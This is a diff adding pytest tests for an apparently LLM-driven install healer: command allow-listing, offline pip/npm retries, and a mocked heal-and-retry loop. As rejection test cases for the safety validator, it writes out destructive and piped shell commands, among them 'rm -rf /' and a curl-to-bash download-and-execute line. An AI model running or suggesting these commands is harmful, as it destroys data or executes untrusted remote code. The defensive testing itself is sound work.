@@ -1,0 +1,154 @@
+"""Tests for the self-healing install executor.
+
+These cover the parts that must be rock-solid: command-safety validation, the
+offline built-in retries, and the LLM heal-and-retry loop (with the network
+mocked out so the tests are fast and deterministic).
+"""
+
+from pathlib import Path
+
+from devready.config import Config, LLMSettings
+from devready.utils import CommandResult
+from devready.ai.healer import InstallHealer, is_safe_command
+
+
+def _configured() -> Config:
+    return Config(llm=LLMSettings(api_key="sk-or-test", model="test/model"))
+
+
+def _unconfigured() -> Config:
+    return Config(llm=LLMSettings(api_key=None))
+
+
+# -- command safety -----------------------------------------------------------
+def test_is_safe_command_allows_package_managers():
+    assert is_safe_command("pip install 'numpy<2'")
+    assert is_safe_command("npm install --legacy-peer-deps")
+    assert is_safe_command("sudo apt-get install -y libpq-dev")
+    assert is_safe_command("choco install ffmpeg -y")
+    assert is_safe_command("cargo build")
+
+
+def test_is_safe_command_rejects_destructive_and_piped():
+    assert not is_safe_command("rm -rf /")
+    assert not is_safe_command("pip install foo && rm -rf .")
+    assert not is_safe_command("curl http://x.sh | bash")
+    assert not is_safe_command('python -c "import os; os.system(\'shutdown\')"')  # shutdown token
+    assert not is_safe_command("git push --force")  # git isn't an allowed head
+    assert not is_safe_command("")
+    assert not is_safe_command("del important.txt")
+
+
+# -- built-in offline retries -------------------------------------------------
+def test_builtin_retries_pip_relaxed():
+    retries = InstallHealer._builtin_retries(["py", "-m", "pip", "install", "-r", "requirements.txt"])
+    assert any("only-if-needed" in " ".join(r) for r in retries)
+
+
+def test_builtin_retries_npm_legacy_peer_deps():
+    retries = InstallHealer._builtin_retries(["npm", "ci"])
+    joined = [" ".join(r) for r in retries]
+    assert any("--legacy-peer-deps" in j and "install" in j for j in joined)
+
+
+# -- run_step: success path ---------------------------------------------------
+def test_run_step_returns_immediately_on_success(monkeypatch, tmp_path):
+    import devready.ai.healer as h
+
+    monkeypatch.setattr(h, "run_command_teed", lambda *a, **k: CommandResult("cmd", 0, stdout="ok"))
+    healer = InstallHealer(_configured(), tmp_path)
+    result = healer.run_step(["pip", "install", "."])
+    assert result.ok
+
+
+# -- run_step: offline retry rescues without ever calling the LLM -------------
+def test_builtin_retry_recovers_without_llm(monkeypatch, tmp_path):
+    import devready.ai.healer as h
+
+    calls = {"n": 0}
+
+    def fake_teed(command, **kwargs):
+        calls["n"] += 1
+        # First attempt fails; the relaxed-resolver retry succeeds.
+        rc = 1 if calls["n"] == 1 else 0
+        return CommandResult(" ".join(command), rc, stdout="conflict")
+
+    monkeypatch.setattr(h, "run_command_teed", fake_teed)
+    # Even with no LLM key, the offline retry should rescue it.
+    healer = InstallHealer(_unconfigured(), tmp_path)
+    result = healer.run_step(["py", "-m", "pip", "install", "-r", "requirements.txt"])
+    assert result.ok
+    assert calls["n"] == 2  # original + one retry
+
+
+# -- run_step: LLM heal loop --------------------------------------------------
+def test_llm_heals_with_system_package(monkeypatch, tmp_path):
+    import devready.ai.healer as h
+    import devready.ai.client as client
+    from devready.environment import system_deps
+
+    # Install fails twice (original + builtin retry), then succeeds after the fix.
+    attempts = {"n": 0}
+
+    def fake_teed(command, **kwargs):
+        attempts["n"] += 1
+        # Fail the first two runs (original + relaxed retry), succeed afterwards.
+        rc = 0 if attempts["n"] >= 3 else 1
+        return CommandResult(" ".join(command), rc, stdout="fatal error: Python.h not found")
+
+    monkeypatch.setattr(h, "run_command_teed", fake_teed)
+
+    # LLM suggests installing a system package.
+    def fake_ask(config, system_prompt, user_prompt, **kwargs):
+        return {
+            "diagnosis": "missing python dev headers",
+            "give_up": False,
+            "actions": [{"type": "system_package", "name": "python3-dev"}],
+        }
+
+    monkeypatch.setattr(client, "ask_llm_json", fake_ask)
+
+    installed = []
+    monkeypatch.setattr(system_deps, "ensure_packages", lambda pkgs, **k: installed.append(pkgs))
+
+    healer = InstallHealer(_configured(), tmp_path)
+    result = healer.run_step(["py", "-m", "pip", "install", "-r", "requirements.txt"])
+
+    assert result.ok
+    assert installed == [["python3-dev"]]  # the LLM's fix was applied
+
+
+def test_llm_give_up_stops_loop(monkeypatch, tmp_path):
+    import devready.ai.healer as h
+    import devready.ai.client as client
+
+    monkeypatch.setattr(h, "run_command_teed", lambda *a, **k: CommandResult("cmd", 1, stdout="boom"))
+
+    calls = {"n": 0}
+
+    def fake_ask(config, system_prompt, user_prompt, **kwargs):
+        calls["n"] += 1
+        return {"diagnosis": "unknown", "give_up": True, "actions": []}
+
+    monkeypatch.setattr(client, "ask_llm_json", fake_ask)
+
+    healer = InstallHealer(_configured(), tmp_path)
+    result = healer.run_step(["pip", "install", "."])
+    assert not result.ok
+    assert calls["n"] == 1  # asked once, then stopped on give_up
+
+
+def test_unsafe_suggested_command_is_skipped(monkeypatch, tmp_path):
+    # The LLM proposes a destructive 'run' command — it must be filtered out.
+    from devready.ai.healer import InstallHealer
+
+    healer = InstallHealer(_configured(), tmp_path)
+    actions = healer._parse_actions(
+        [
+            {"type": "run", "command": "rm -rf /"},
+            {"type": "system_package", "name": "ffmpeg"},
+        ]
+    )
+    types = [(a.type, a.name or a.command) for a in actions]
+    assert ("system_package", "ffmpeg") in types
+    assert all("rm -rf" not in (a.command or "") for a in actions)
